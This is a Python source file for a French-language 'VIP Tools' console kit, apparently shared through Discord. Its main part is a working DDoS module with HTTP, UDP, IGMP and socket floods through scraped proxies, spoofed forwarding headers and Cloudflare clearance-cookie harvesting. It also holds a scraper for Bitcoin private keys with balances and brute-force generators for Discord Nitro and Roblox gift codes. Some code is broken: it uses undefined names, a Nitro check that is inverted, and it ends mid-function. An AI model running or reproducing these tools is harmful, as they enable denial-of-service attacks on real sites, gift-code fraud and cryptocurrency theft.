from tkinter.colorchooser import Chooser
from pystyle import Colorate, Center, Write, Anime, Colors, System, Col
import os, time 
import random
from urllib import request, response
import pystyle
import time
import requests
from pystyle import Box
from pystyle import Add
import string
import random
import colorama
from os import system
from colorama import Fore

    





barre = """\n\n╔═════[VIP@Aziz]\n\n"""

barre2 = """╔═════[ID]"""

barre3 = """@password]"""

barre4 = """╔═════["""

Barre5 = (Colorate.Vertical(Colors.red_to_black, "L I V E: "))

barre6 = (Colorate.Vertical(Colors.white_to_black, " VIP "))

barre7 = (Colorate.Vertical(Colors.green_to_cyan, " | "))

barre8 = (Colorate.Vertical(Colors.blue_to_cyan, " Discord :"))

barre9= (Colorate.Vertical(Colors.white_to_black, "https://discord.gg/BTSn8RzVHj"))

barre10 = (Colorate.Vertical(Colors.cyan_to_green, " <Fresh update done!>"))

ascii = """

                                      ╦  ╦╦╔═╗  
                                      ╚╗╔╝║╠═╝  
                                       ╚╝ ╩╩    
                   ══════╦══════════════════════════════╦═════   
                      ╔══╩══════════════════════════════╩══╗
                      ║- - - -Welcome to VIP Tools  - - - -║
                      ║    Enjoy with tool made by Aziz.   ║  
                      ╚══╦══════════════════════════════╦══╝
             ╔═══════════╩══════════════════════════════╩═════════╗
             ║ - -Copyright @ 2022   VIP   All Rights Reserved- - ║
             ║ - - -Please Type [HELP] To view All  Commands- - - ║
             ╚════════════════════════════════════════════════════╝"""

ascii2= """
                                      ╦  ╦╦╔═╗  
                                      ╚╗╔╝║╠═╝  
                                       ╚╝ ╩╩    
                      ╚════╦════════════════════════╦════╝    
                  ╔════════╩════════════════════════╩════════╗
                  ║  TECH > TECHNIQUE DIVERSES               ║  
                  ║  GEN > GENERATEUR DE COMPTE              ║
                  ║  RULES > NOTRE LISTE DE REGLES/TOS       ║
                  ║  TOOLS > DES TOOLS                       ║
                  ║  CLEAR > CLEAR LE  TERMINAL              ║
                  ║  CLS > FERMEZ LA SESSION                 ║
                  ╚══════════════════════════════════════════╝"""

ascii3= """
                                      ╦  ╦╦╔═╗  
                                      ╚╗╔╝║╠═╝  
                                       ╚╝ ╩╩    
                      ╚════╦════════════════════════╦════╝    
                  ╔════════╩════════════════════════╩════════╗
                  ║  DDOS >  VIP DDOS                        ║  
                  ║  BTCMINER > MINEUR DE WALLET             ║
                  ╚══════════════════════════════════════════╝"""



ascii5 = """
  ╦  ╦╦╔═╗  
  ╚╗╔╝║╠═╝  
   ╚╝ ╩╩    

[PLEASE READ THE FOLLOWING RULES]
1) ~ I'm not responsable of your actes  !
"""




def barreH():
        System.Clear()
        print(Barre5 + barre6 + barre7 + barre8 + barre9 + barre7 + barre10)
        

def interface():
    System.Clear()
    print('\x1b[38;2;0;255;253m| \x1b[38;2;255;0;55mL I V E: \x1b[38;2;46;42;42mVIP \x1b[38;2;0;255;253m| \x1b[38;2;146;109;238mDISCORD:\x1b[38;2;235;40;189m htt\x1b[38;2;228;47;190mps:\x1b[38;2;221;54;191m//\x1b[38;2;214;61;192mdis\x1b[38;2;207;68;193mcor\x1b[38;2;200;75;194md.gg\x1b[38;2;193;82;195m/\x1b[38;2;186;89;196mcqS\x1b[38;2;179;96;197mhgn\x1b[38;2;172;103;198mqy5\x1b[38;2;165;110;199mT \x1b[38;2;0;255;253m| \x1b[38;2;235;40;189m[\x1b[38;2;3;252;136mENJOY!\x1b[38;2;235;40;189m]')
    print(Colorate.Vertical(Colors.cyan_to_blue, (ascii)))

def interface1():
    System.Clear
    print('\x1b[38;2;0;255;253m| \x1b[38;2;255;0;55mL I V E: \x1b[38;2;46;42;42mVIP \x1b[38;2;0;255;253m| \x1b[38;2;146;109;238mDISCORD:\x1b[38;2;235;40;189m htt\x1b[38;2;228;47;190mps:\x1b[38;2;221;54;191m//\x1b[38;2;214;61;192mdis\x1b[38;2;207;68;193mcor\x1b[38;2;200;75;194md.gg\x1b[38;2;193;82;195m/\x1b[38;2;186;89;196mcqS\x1b[38;2;179;96;197mhgn\x1b[38;2;172;103;198mqy5\x1b[38;2;165;110;199mT \x1b[38;2;0;255;253m| \x1b[38;2;235;40;189m[\x1b[38;2;3;252;136mENJOY!\x1b[38;2;235;40;189m]')
    print(Colorate.Vertical(Colors.cyan_to_blue, (ascii2)))
    print (Colorate.Horizontal(Colors.purple_to_blue, (barre)))
    cmd = Write.Input("╚══>", Colors.purple_to_blue)
    if cmd == 'help':
            os.system('cls' if os.name == 'nt' else 'clear')
            interface1()
    if cmd == 'clear':
            main()
    if cmd == 'cls':
           exit()
    if cmd == 'rules':
            os.system('cls' if os.name == 'nt' else 'clear')
            interface4()
    if cmd == 'tech':
            os.system('cls' if os.name == 'nt' else 'clear')
            interfacetech()
    if cmd == 'gen':
            os.system('cls' if os.name == 'nt' else 'clear')
            gen()
    if cmd == 'ddos':
            os.system('cls' if os.name == 'nt' else 'clear')
            ddos()           
    if cmd == 'btcminer':
            os.system('cls' if os.name == 'nt' else 'clear')
            btcminer()
    if cmd == 'tools':
            os.system('cls' if os.name == 'nt' else 'clear')
            interface5()   
    
    else:
            print(Colorate.Horizontal(Colors.red_to_yellow, "Error Syntax 404"))
            time.sleep(2)
            main()





def interface3():
    System.Clear
    print('\x1b[38;2;0;255;253m| \x1b[38;2;255;0;55mL I V E: \x1b[38;2;46;42;42mVIP \x1b[38;2;0;255;253m| \x1b[38;2;146;109;238mDISCORD:\x1b[38;2;235;40;189m htt\x1b[38;2;228;47;190mps:\x1b[38;2;221;54;191m//\x1b[38;2;214;61;192mdis\x1b[38;2;207;68;193mcor\x1b[38;2;200;75;194md.gg\x1b[38;2;193;82;195m/\x1b[38;2;186;89;196mcqS\x1b[38;2;179;96;197mhgn\x1b[38;2;172;103;198mqy5\x1b[38;2;165;110;199mT \x1b[38;2;0;255;253m| \x1b[38;2;235;40;189m[\x1b[38;2;3;252;136mENJOY!\x1b[38;2;235;40;189m]')
    print(Colorate.Vertical(Colors.cyan_to_blue, (ascii4)))
    print (Colorate.Horizontal(Colors.purple_to_blue, (barre)))
    cmd = Write.Input("╚══>", Colors.purple_to_blue)
    if cmd == 'help':
            os.system('cls' if os.name == 'nt' else 'clear')
            interface1()
    if cmd == 'clear':
            main()
    if cmd == 'exit':
           exit()
    if cmd == 'rules':
            os.system('cls' if os.name == 'nt' else 'clear')
            interface4()
    if cmd == 'tech':
            os.system('cls' if os.name == 'nt' else 'clear')
            interfacetech()

    if cmd == 'gen':
            os.system('cls' if os.name == 'nt' else 'clear')
            gen()
    if cmd == 'ddos':
            os.system('cls' if os.name == 'nt' else 'clear')
            ddos()
    if cmd == 'btcminer':
            os.system('cls' if os.name == 'nt' else 'clear')
            btcminer()
    if cmd == 'tools':
            os.system('cls' if os.name == 'nt' else 'clear')
            interface5()     
    else:
            print(Colorate.Horizontal(Colors.red_to_yellow, "Error Syntax 404"))
            time.sleep(2)
            main()

def interface4():
    System.Clear
    print('\x1b[38;2;0;255;253m| \x1b[38;2;255;0;55mL I V E: \x1b[38;2;46;42;42mVIP \x1b[38;2;0;255;253m| \x1b[38;2;146;109;238mDISCORD:\x1b[38;2;235;40;189m htt\x1b[38;2;228;47;190mps:\x1b[38;2;221;54;191m//\x1b[38;2;214;61;192mdis\x1b[38;2;207;68;193mcor\x1b[38;2;200;75;194md.gg\x1b[38;2;193;82;195m/\x1b[38;2;186;89;196mcqS\x1b[38;2;179;96;197mhgn\x1b[38;2;172;103;198mqy5\x1b[38;2;165;110;199mT \x1b[38;2;0;255;253m| \x1b[38;2;235;40;189m[\x1b[38;2;3;252;136mENJOY!\x1b[38;2;235;40;189m]')
    print(Colorate.Vertical(Colors.cyan_to_blue, (ascii5)))
    print (Colorate.Horizontal(Colors.purple_to_blue, (barre)))
    cmd = Write.Input("╚══>", Colors.purple_to_blue)
    if cmd == 'help':
            os.system('cls' if os.name == 'nt' else 'clear')
            interface1()
    if cmd == 'clear':
            main()
    if cmd == 'exit':
           exit()
    if cmd == 'rules':
            os.system('cls' if os.name == 'nt' else 'clear')
            interface4()
    if cmd == 'tech':
            os.system('cls' if os.name == 'nt' else 'clear')
            interfacetech()
    if cmd == 'gen':
            os.system('cls' if os.name == 'nt' else 'clear')
    if cmd == 'gen':
            os.system('cls' if os.name == 'nt' else 'clear')
            gen()
    if cmd == 'ddos':
            os.system('cls' if os.name == 'nt' else 'clear')
            ddos()
    if cmd == 'btcminer':
            os.system('cls' if os.name == 'nt' else 'clear')
            btcminer()
    if cmd == 'tools':
            os.system('cls' if os.name == 'nt' else 'clear')
            interface5()                 
    else:
            print(Colorate.Horizontal(Colors.red_to_yellow, "Error Syntax 404"))
            time.sleep(2)
            main()

def interface5():
    System.Clear
    print('\x1b[38;2;0;255;253m| \x1b[38;2;255;0;55mL I V E: \x1b[38;2;46;42;42mVIP \x1b[38;2;0;255;253m| \x1b[38;2;146;109;238mDISCORD:\x1b[38;2;235;40;189m htt\x1b[38;2;228;47;190mps:\x1b[38;2;221;54;191m//\x1b[38;2;214;61;192mdis\x1b[38;2;207;68;193mcor\x1b[38;2;200;75;194md.gg\x1b[38;2;193;82;195m/\x1b[38;2;186;89;196mcqS\x1b[38;2;179;96;197mhgn\x1b[38;2;172;103;198mqy5\x1b[38;2;165;110;199mT \x1b[38;2;0;255;253m| \x1b[38;2;235;40;189m[\x1b[38;2;3;252;136mENJOY!\x1b[38;2;235;40;189m]')
    print(Colorate.Vertical(Colors.cyan_to_blue, (ascii3)))
    print (Colorate.Horizontal(Colors.purple_to_blue, (barre)))
    cmd = Write.Input("╚══>", Colors.purple_to_blue)
    if cmd == 'help':
            os.system('cls' if os.name == 'nt' else 'clear')
            interface1()
    if cmd == 'clear':
            main()
    if cmd == 'cls':
           exit()
    if cmd == 'rules':
            os.system('cls' if os.name == 'nt' else 'clear')
            interface4()
    if cmd == 'tech':
            os.system('cls' if os.name == 'nt' else 'clear')
            interfacetech()
    if cmd == 'gen':
            os.system('cls' if os.name == 'nt' else 'clear')
            gen()
    if cmd == 'ddos':
            os.system('cls' if os.name == 'nt' else 'clear')
            ddos()           
    if cmd == 'btcminer':
            os.system('cls' if os.name == 'nt' else 'clear')
            btcminer()
    if cmd == 'tools':
            os.system('cls' if os.name == 'nt' else 'clear')
            interface5() 
    else:
            print(Colorate.Horizontal(Colors.red_to_yellow, "Error Syntax 404"))
            time.sleep(2)
            main()


def btcminer():
    import requests
    from requests.structures import CaseInsensitiveDict
    from bs4 import BeautifulSoup
    import time
    import os

    checked = 0

    while True:
        os.system(f"title VIP WALLET MINER // Checked Wallets: {checked} // BY HALAL")
        url = "https://www.bitcoinlist.io/random"
        headers = CaseInsensitiveDict()
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36"
        req = requests.get(url, headers=headers)
        soup = BeautifulSoup(req.content, 'html.parser')
        wallets = soup.find_all("tr")
        for wallet in wallets:
            getwallet = str(wallet.getText()).strip()
            privkey = getwallet.split()[0].strip()
            uncompaddy = getwallet.split()[1].strip()
            compaddy = getwallet.split()[2].strip()
            balance = getwallet.split()[3].strip()
            if "Private Key" in getwallet:
                pass
            else:
                checked += 1
                if float(balance) > 0:              
                    open('hits.txt', 'a+').write(f"{balance} BTC found in Adress: {compaddy} // Private Key: {privkey}")
                os.system("cls")
                os.system(f"title VIP WALLET MINER // Checked Wallets: {checked} // BY HALAL")
                print(f"""
                .-.____________________.-.
         ___ _.' .-----.    _____________|======+--------------------+
        /_._/   (      |   /_____________|      |   VIP WALLET MINER |
          /      `  _ ____/                     |      BY HALAL      |
         |_      .\( \\                          |____________________|
        .'  `-._/__`_//
      .'       |'           Private Key: {privkey}
     /        /             Uncompressed Address: {uncompaddy}
    /        |              Compressed Address: {compaddy}
    |        '              Balance: {balance} BTC
    |        |              Les code valide seront ecris dans le hits.txt fournit avec le tools
    `-._____.-'""")



    


def gen():
  System.Clear
  os.system("cls")
  WELCOME = ("\n         By !' ML$D#9999 | Halal#9999")
  banner = ("""
      .::.                   ( ((
     'H .-;-.-.-.-.-.-.-.-.-/| ((::::::::::::::::::::::::::::::::::::::::::::::.._
    (D ( ( ( ( ( ( ( ( ( ( ( |  ))   -====================================-      _.>
     `S `-;-`-`-`-`-`-`-`-`-\| ((::::::::::::::::::::::::::::::::::::::::::::::''
      `::'                    \ \(
                               ) ))
                              (_((
    """)
  txt= ("1) Nitro Generator   2) Roblox Card Generator")
  print(Colorate.Horizontal(Colors.yellow_to_red, (banner), 1))
  print(Colorate.Horizontal(Colors.yellow_to_red, (WELCOME)))
  print(Colorate.Horizontal(Colors.yellow_to_red, (txt)))
  reponsegen = input("> ")
  if reponsegen == '2':
    os.system("cls")
    WELCOME = ("\nMade by Halal#9999 │ https://discord.gg/cqShgnqy5T\n        VIP DISCORD SERVER  ")
    banner = ("""
     ██████╗ ███████╗███╗   ██╗
    ██╔════╝ ██╔════╝████╗  ██║
    ██║  ███╗█████╗  ██╔██╗ ██║
    ██║   ██║██╔══╝  ██║╚██╗██║
    ╚██████╔╝███████╗██║ ╚████║
     ╚═════╝ ╚══════╝╚═╝  ╚═══╝
    """)

    print(Add.Add(banner, WELCOME, 4))


    num = int(input('Combien de code voulez vous gen ? : '))
    for i in range(num):
        code = "".join(random.choices(
            string.digits ,
            k = 10
        ))

        url = requests.get(f"https://api.roblox.com/payments-gateway/v1/gift-card/redeem/{code}")
        if url.status_code == 200:
            print( Fore.GREEN + f"[VALID]" f"│  {code}")
            input("")    
        elif url.status_code == 404: 
            print( Fore.RED +  f"[INVALID]" f"│ {code}")
        else:
            print("ERROR PLEASE CONTACT THE OWNER !")
            input("")
    




  elif reponsegen == '1':
    System.Clear
    
    WELCOME = ("\nMade by Halal#9999 - https://discord.gg/cqShgnqy5T\nTout les code sont check ! ")
    banner = ("""
     ██████╗ ███████╗███╗   ██╗    ███╗   ██╗██╗████████╗██████╗  ██████╗ 
    ██╔════╝ ██╔════╝████╗  ██║    ████╗  ██║██║╚══██╔══╝██╔══██╗██╔═══██╗
    ██║  ███╗█████╗  ██╔██╗ ██║    ██╔██╗ ██║██║   ██║   ██████╔╝██║   ██║
    ██║   ██║██╔══╝  ██║╚██╗██║    ██║╚██╗██║██║   ██║   ██╔══██╗██║   ██║
    ╚██████╔╝███████╗██║ ╚████║    ██║ ╚████║██║   ██║   ██║  ██║╚██████╔╝
     ╚═════╝ ╚══════╝╚═╝  ╚═══╝    ╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ 




    """)

    print(Add.Add(banner, WELCOME, 4))

    
    num = int(input('Combien de code voulez vous gen ? : '))
    for i in range(num):
        code = "".join(random.choices(
            string.ascii_uppercase + string.digits + string.ascii_lowercase,
            k = 16
        ))

        url = requests.get(f"https://discord.gift/{code}")
        if url.status_code == 404:
            print( Fore.GREEN + f"[VALID]" f"│ https://discord.gift/{code}")
            input("")    
        elif url.status_code == 200: 
            print( Fore.RED +  f"[INVALID]" f"│ https://discord.gift/{code}")
        else:
            print("ERROR PLEASE CONTACT THE OWNER !")
    

  else:
    print(Colorate.Horizontal(Colors.red_to_yellow, "Error Syntax 404"))
    time.sleep(2)
    main()
  

def ddos():

  from os import system, name
  import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
  from turtle import back
  from urllib.parse import urlparse
  from requests.cookies import RequestsCookieJar
  import undetected_chromedriver as webdriver
  from sys import stdout
  from colorama import Fore, init
  

  def countdown(t):
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      while True:
          if (until - datetime.datetime.now()).total_seconds() > 0:
              stdout.write("\r "+Fore.CYAN+"[!]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
          else:
              stdout.write("\r "+Fore.CYAN+"[!]"+Fore.WHITE+" Attack Done !                                   \n")
              return

  def get_target(url):
      url = url.rstrip()
      target = {}
      target['uri'] = urlparse(url).path
      if target['uri'] == "":
          target['uri'] = "/"
      target['host'] = urlparse(url).netloc
      target['scheme'] = urlparse(url).scheme
      if ":" in urlparse(url).netloc:
          target['port'] = urlparse(url).netloc.split(":")[1]
      else:
          target['port'] = "443" if urlparse(url).scheme == "https" else "80"
          pass
      return target

  def get_proxylist(type):
      if type == "SOCKS5":
          r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
          r += requests.get("https://www.proxy-list.download/api/v1/get?type=socks5").text
          open("./resources/socks5.txt", 'w').write(r)
          r = r.rstrip().split('\r\n')
          return r
      elif type == "HTTP":
          r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http5&timeout=10000&country=all&ssl=all&anonymity=all").text
          r += requests.get("https://www.proxy-list.download/api/v1/get?type=http").text
          open("./resources/http.txt", 'w').write(r)
          r = r.rstrip().split('\r\n')
          return r

  def get_proxies():
      global proxies
      if not os.path.exists("./proxy.txt"):
          stdout.write(Fore.CYAN+" [!]"+Fore.WHITE+" You Need Proxy File ( ./proxy.txt )\n")
          return False
      proxies = open("./proxy.txt", 'r').read().split('\n')
      return True

  def get_cookie(url):
      global useragent, cookieJAR, cookie
      options = webdriver.ChromeOptions()
      arguments = [
      '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
      '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
      '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
      ]
      for argument in arguments:
          options.add_argument(argument)
      driver = webdriver.Chrome(options=options)
      driver.implicitly_wait(3)
      driver.get(url)
      for _ in range(60):
          cookies = driver.get_cookies()
          tryy = 0
          for i in cookies:
              if i['name'] == 'cf_clearance':
                  cookieJAR = driver.get_cookies()[tryy]
                  useragent = driver.execute_script("return navigator.userAgent")
                  cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                  driver.quit()
                  return True
              else:
                  tryy += 1
                  pass
          time.sleep(1)
      driver.quit()
      return False

  def spoof(target):
      addr = [192, 168, 0, 1]
      d = '.'
      addr[0] = str(random.randrange(11, 197))
      addr[1] = str(random.randrange(0, 255))
      addr[2] = str(random.randrange(0, 255))
      addr[3] = str(random.randrange(2, 254))
      spoofip = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
      return (
          "X-Forwarded-Proto: Http\r\n"
          f"X-Forwarded-Host: {target['host']}, 1.1.1.1\r\n"
          f"Via: {spoofip}\r\n"
          f"Client-IP: {spoofip}\r\n"
          f'X-Forwarded-For: {spoofip}\r\n'
          f'Real-IP: {spoofip}\r\n'
      )


  def get_info_l7():
      stdout.write(""+Fore.WHITE+"       URL"+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
      target = input()
      stdout.write(""+Fore.WHITE+"       THREAD"+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
      thread = input()
      stdout.write(""+Fore.WHITE+"       TIME(s)"+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
      t = input()
      return target, thread, t

  def get_info_l4():
      stdout.write(""+Fore.WHITE+"       IP"+Fore.LIGHTCYAN_EX+": ")
      target = input()
      stdout.write(""+Fore.WHITE+"       PORT"+Fore.LIGHTCYAN_EX+": ")
      port = input()
      stdout.write(""+Fore.WHITE+"       THREAD"+Fore.LIGHTCYAN_EX+": ")
      thread = input()
      stdout.write(""+Fore.WHITE+"       TIME(s)"+Fore.LIGHTCYAN_EX+": ")
      t = input()
      return target, port, thread, t


  def runflooder(host, port, th, t):
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      rand = random._urandom(4096)
      for _ in range(int(th)):
          try:
              thd = threading.Thread(target=flooder, args=(host, port, rand, until))
              thd.start()
          except:
              pass

  def flooder(host, port, rand, until_datetime):
      sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
      while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
          try:
              sock.sendto(rand, (host, int(port)))
          except:
              sock.close()
              pass


  def runsender(host, port, th, t, payload):
      if payload == "":
          payload = random._urandom(60000)
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      #payload = Payloads[method]
      for _ in range(int(th)):
          try:
              thd = threading.Thread(target=sender, args=(host, port, until, payload))
              thd.start()
          except:
              pass

  def sender(host, port, until_datetime, payload):
      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
      while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
          try:
              sock.sendto(payload, (host, int(port)))
          except:
              sock.close()
              pass




  def Launch(url, th, t, method): #testing
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      for _ in range(int(th)):
          try:
              exec("threading.Thread(target=Attack"+method+", args=(url, until)).start()")
          except:
              pass


  def LaunchHEAD(url, th, t):
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      for _ in range(int(th)):
          try:
              thd = threading.Thread(target=AttackHEAD, args=(url, until))
              thd.start()
          except:
              pass

  def AttackHEAD(url, until_datetime):
      while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
          try:
              requests.head(url)
              requests.head(url)
          except:
              pass

  def LaunchPOST(url, th, t):
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      for _ in range(int(th)):
          try:
              thd = threading.Thread(target=AttackPOST, args=(url, until))
              thd.start()
          except:
              pass

  def AttackPOST(url, until_datetime):
      while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
          try:
              requests.post(url)
              requests.post(url)
          except:
              pass

  def LaunchRAW(url, th, t):
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      for _ in range(int(th)):
          try:
              thd = threading.Thread(target=AttackRAW, args=(url, until))
              thd.start()
          except:
              pass

  def AttackRAW(url, until_datetime):
      while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
          try:
              requests.get(url)
              requests.get(url)
          except:
              pass

  def LaunchPXRAW(url, th, t):
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      for _ in range(int(th)):
          try:
              thd = threading.Thread(target=AttackPXRAW, args=(url, until))
              thd.start()
          except:
              pass

  def AttackPXRAW(url, until_datetime):
      while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
          proxy = 'http://'+str(random.choice(list(proxies)))
          proxy = {
              'http': proxy,   
              'https': proxy,
          }
          try:
              requests.get(url, proxies=proxy)
              requests.get(url, proxies=proxy)
          except:
              pass

  def LaunchPXSOC(url, th, t):
      target = get_target(url)
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      req =  "GET " +target['uri'] + " HTTP/1.1\r\n"
      req += "Host: " + target['host'] + "\r\n"
      req += "User-Agent: " + random.choice(log) + "\r\n"
      req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
      req += "Connection: Keep-Alive\r\n\r\n"
      for _ in range(int(th)):
          try:
              thd = threading.Thread(target=AttackPXSOC, args=(target, until, req))
              thd.start()
          except:
              pass

  def AttackPXSOC(target, until_datetime, req):
      while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
          try:
              proxy = random.choice(list(proxies)).split(":")
              if target['scheme'] == 'https':
                  s = socks.socksocket()
                  s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                  s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                  s.connect((str(target['host']), int(target['port'])))
                  s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
              else:
                  s = socks.socksocket()
                  s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                  s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                  s.connect((str(target['host']), int(target['port'])))
              try:
                  for _ in range(100):
                      s.send(str.encode(req))
              except:
                  s.close()
          except:
              return

  def LaunchSOC(url, th, t):
      target = get_target(url)
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
      req += "User-Agent: " + random.choice(log) + "\r\n"
      req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
      req += "Connection: Keep-Alive\r\n\r\n"
      for _ in range(int(th)):
          try:
              thd = threading.Thread(target=AttackSOC, args=(target, until, req))
              thd.start()
          except:
              pass

  def AttackSOC(target, until_datetime, req):
      if target['scheme'] == 'https':
          s = socks.socksocket()
          s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
          s.connect((str(target['host']), int(target['port'])))
          s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
      else:
          s = socks.socksocket()
          s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
          s.connect((str(target['host']), int(target['port'])))
      while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
          try:
              try:
                  for _ in range(100):
                      s.send(str.encode(req))
              except:
                  s.close()
          except:
              pass
  

  def LaunchPPS(url, th, t):
      target = get_target(url)
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      for _ in range(int(th)):
          try:
              thd = threading.Thread(target=AttackPPS, args=(target, until))
              thd.start()
          except:
              pass

  def AttackPPS(target, until_datetime): #
      if target['scheme'] == 'https':
          s = socks.socksocket()
          s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
          s.connect((str(target['host']), int(target['port'])))
          s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
      else:
          s = socks.socksocket()
          s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
          s.connect((str(target['host']), int(target['port'])))
      while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
          try:
              try:
                  for _ in range(100):
                      s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
              except:
                  s.close()
          except:
              pass

  def LaunchNULL(url, th, t):
      target = get_target(url)
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
      req += "User-Agent: null\r\n"
      req += "Referrer: null\r\n"
      req += spoof(target) + "\r\n"
      for _ in range(int(th)):
          try:
              thd = threading.Thread(target=AttackNULL, args=(target, until, req))
              thd.start()
          except:
              pass

  def AttackNULL(target, until_datetime, req): #
      if target['scheme'] == 'https':
          s = socks.socksocket()
          s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
          s.connect((str(target['host']), int(target['port'])))
          s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
      else:
          s = socks.socksocket()
          s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
          s.connect((str(target['host']), int(target['port'])))
      while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
          try:
              try:
                  for _ in range(100):
                      s.send(str.encode(req))
              except:
                  s.close()
          except:
              pass

  def LaunchSPOOF(url, th, t):
      target = get_target(url)
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
      req += "User-Agent: " + random.choice(log) + "\r\n"
      req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
      req += spoof(target)
      req += "Connection: Keep-Alive\r\n\r\n"
      for _ in range(int(th)):
          try:
              thd = threading.Thread(target=AttackSPOOF, args=(target, until, req))
              thd.start()
          except:
              pass

  def AttackSPOOF(target, until_datetime, req): #
      if target['scheme'] == 'https':
          s = socks.socksocket()
          s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
          s.connect((str(target['host']), int(target['port'])))
          s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
      else:
          s = socks.socksocket()
          s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
          s.connect((str(target['host']), int(target['port'])))
      while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
          try:
              try:
                  for _ in range(100):
                      s.send(str.encode(req))
              except:
                  s.close()
          except:
              pass

  def LaunchPXSPOOF(url, th, t, proxy):
      target = get_target(url)
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
      req += "User-Agent: " + random.choice(log) + "\r\n"
      req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
      req += spoof(target)
      req += "Connection: Keep-Alive\r\n\r\n"
      for _ in range(int(th)):
          try:
              randomproxy = random.choice(proxy)
              thd = threading.Thread(target=AttackPXSPOOF, args=(target, until, req, randomproxy))
              thd.start()
          except:
              pass

  def AttackPXSPOOF(target, until_datetime, req, proxy): #
      proxy = proxy.split(":")
      print(proxy)
      try:
          if target['scheme'] == 'https':
              s = socks.socksocket()
              #s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
              s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
              s.connect((str(target['host']), int(target['port'])))
              s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
          else:
              s = socks.socksocket()
              #s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
              s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
